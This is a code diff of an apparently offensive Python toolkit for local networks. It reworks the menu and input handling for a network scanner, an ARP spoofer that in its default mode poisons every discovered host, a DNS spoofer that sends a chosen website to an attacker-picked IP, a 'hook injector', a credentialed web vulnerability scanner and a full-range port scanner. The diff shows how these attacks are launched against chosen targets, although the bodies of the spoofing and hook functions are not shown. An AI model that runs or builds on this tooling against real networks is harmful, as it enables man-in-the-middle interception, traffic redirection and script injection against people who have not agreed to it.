@@ -28,7 +28,6 @@ def broadcast(ip):
 # function that scans network IPs
 def network_scanner():
     print('[+] Capturing Local Network Address...')
-    time.sleep(0.1)
     route = re.findall(r'[0-9]+(?:\.[0-9]+){3}', str(scapy.conf.route))
     network, netmask, machine_ip = route[4], route[5], route[7]
     if network and netmask:
@@ -39,7 +38,6 @@ def network_scanner():
             cidr = sum([bin(int(x)).count('1') for x in netmask.split('.')])
             scan_ip = network + '/' + str(cidr)
             print('[+] Scanning Network...')
-            time.sleep(0.1)
             final = []
             for _ in range(0, 5):
                 temp = [ip[1].psrc for ip in broadcast(scan_ip)]
@@ -56,20 +54,21 @@ def network_scanner():
             return
     else:
         print("[-] Could not read Network or Subnet Mask. Scan failed.")
-        time.sleep(0.1)
         return
 
 
 # function that returns target, source IPs from input
 def ip_input(scan_list):
+    trgt, src = '', ''
     print("IP Table")
     print("--------")
     for ip in scan_list:
         print(ip)
     print("--------")
-    trgt = input('Your target IP: ')
-    src = input('Your source IP: ')
-    return trgt, src
+    while trgt not in scan_list or src not in scan_list:
+        trgt = input('\nYour target IP: ')
+        src = input('Your source IP: ')
+    return [trgt], src
 
 
 # function that returns MAC address of selected IP
@@ -255,10 +254,29 @@ def kill_arp():
         print('[-] No arp spoof running at the moment.')
 
 
+def vulnscan_info():
+    ignore = []
+    target = input('Your target URL: ')
+    decision = input('Do you want to ignore any link types[y/n]: ')
+    while decision.lower() == 'y':
+        ignore.append(input('Link to ignore: '))
+        decision = input('Ignore another?[y/n]: ')
+    scanner = Scanner(target, ignore)
+
+    decision = input('Do you want to insert login credentials[y/n]: ')
+    if decision.lower() == 'y':
+        login_url = input('Login URL: ')
+        username = input('Username: ')
+        password = input('Password: ')
+        data_dict = {"username": username, "password": password, "Login": "submit"}
+        scanner.session.post(login_url, data=data_dict)
+    return scanner
+
+
 def port_scanner():
     port_list_tcp = []
     ip = input("Insert IP: ")
-    print("Scanning...")
+    print("[+] Scanning...")
     for port in range(1, 65536):
         try:
             socket.setdefaulttimeout(2)
@@ -305,49 +323,30 @@ while True:
     if command == "exit":
         kill_arp()
         print("[+] Cya later Boss!")
-        time.sleep(0.1)
         sys.exit()
 
     elif command == "scan":
         scan_result = network_scanner()
 
     elif command == "arpspoof":
-        if allow_arp:
-            if scan_result:
-                option = ''
-                while option != 'auto' and option != 'man':
-                    print('Type "man" or "auto" for arpspoof')
-                    option = input(">> Option: ")
-                if option == 'man':
-                    selected = []
-                    target, source = ip_input(scan_result)
-                    while target not in scan_result or source not in scan_result:
-                        print("[-] IPs not found in list. Try again")
-                        time.sleep(0.1)
-                        target, source = ip_input(scan_result)
-                    selected.append(target)
-                    arp_process = multiprocessing.Process(target=arp_spoof, args=(selected, source))
-                    print("[+] Initializing Arp Spoof...")
-                    time.sleep(0.1)
-                    arp_process.start()
-                    allow_arp = 0
-                elif option == 'auto':
-                    if router_ip:
-                        source = router_ip
-                        selected = scan_result
-                        arp_process = multiprocessing.Process(target=arp_spoof, args=(selected, source))
-                        print("[+] Initializing Arp Spoof...")
-                        time.sleep(0.1)
-                        arp_process.start()
-                        allow_arp = 0
-                    else:
-                        print("[-] Router IP not found. Choose manually..")
-                        time.sleep(0.1)
+        if allow_arp and scan_result:
+            option = ''
+            print('Default mode: auto. Type "man" for manual')
+            option = input(">> Option: ")
+
+            if option == 'man':
+                selected = []
+                selected, source = ip_input(scan_result)
             else:
-                print("[-] Network IPs not defined. Please scan first.")
-                time.sleep(0.1)
+                source = router_ip
+                selected = scan_result
+
+            arp_process = multiprocessing.Process(target=arp_spoof, args=(selected, source))
+            print("[+] Initializing Arp Spoof...")
+            arp_process.start()
+            allow_arp = 0
         else:
-            print('[!] Arp spoof already running.')
+            print('[!] Network IPs not defined or Arp spoof already running.')
 
     elif command == 'dnsspoof':
         if allow_dns:
@@ -358,7 +357,6 @@ while True:
                     modified_ip = input('Your redirect IP: ')
                     dns_process = multiprocessing.Process(target=dns_spoof, args=(target_website, modified_ip))
                     print("[+] Initializing Dns Spoof...")
-                    time.sleep(0.1)
                     dns_process.start()
                     allow_dns = 0
                 else:
@@ -375,7 +373,6 @@ while True:
                     kill_dns()
                     hook_process = multiprocessing.Process(target=hook)
                     print("[+] Initializing Hook Injector...")
-                    time.sleep(0.1)
                     hook_process.start()
                     allow_hook = 0
                 else:
@@ -386,25 +383,8 @@ while True:
             print('[!] Hook injector already running.')
 
     elif command == 'vulnscan':
-        login_info = False
-        ignore_links = []
-        target_url = input('Your target URL: ')
-        vuln_decision = input('Do you want to ignore any link types[y/n]: ')
-        while vuln_decision.lower() == 'y':
-            ignore_links.append(input('Link to ignore: '))
-            vuln_decision = input('Ignore another?[y/n]: ')
-        vuln_decision = input('Do you want to insert login credentials[y/n]: ')
-        if vuln_decision.lower() == 'y':
-            vuln_login_url = input('Login URL: ')
-            vuln_username = input('Username: ')
-            vuln_password = input('Password: ')
-            login_info = True
-        print("[+] Initializing Vulnerability Scanner...")
-        time.sleep(0.1)
-        vuln_scanner = Scanner(target_url, ignore_links)
-        if login_info:
-            data_dict = {"username": vuln_username, "password": vuln_password, "Login": "submit"}
-            vuln_scanner.session.post(vuln_login_url, data=data_dict)
+        vuln_scanner = vulnscan_info()
+        print("\n[+] Initializing Vulnerability Scanner...")
         try:
             vuln_scanner.crawl()
             vuln_scanner.run_scanner()
